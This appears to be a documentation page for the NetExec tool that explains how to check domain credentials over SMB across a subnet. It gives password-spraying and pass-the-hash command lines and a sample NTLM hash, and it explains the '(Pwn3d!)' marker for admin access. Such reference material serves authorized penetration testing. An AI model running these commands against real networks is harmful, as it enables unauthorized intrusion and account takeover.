# Checking Credentials (Domain)

### Authentication

* Failed logins result in a \[-]
* Successful logins result in a \[+] Domain\Username:Password

{% hint style="info" %}
Code execution results in a (Pwn3d!) added after the login confirmation. With SMB protocol, most likely you compromised user is in the local administrators group.
{% endhint %}

```
    SMB         192.168.1.101    445    HOSTNAME          [+] DOMAIN\Username:Password (Pwn3d!)
```

The following checks will attempt authentication to the entire /24 though a single target may also be used.

### User/Password

```
#~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE'
```

### User/Hash

After obtaining credentials such as\
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::\
you can use both the full hash or just the nt hash (second half)

```
#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
#~ nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
#~ nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```
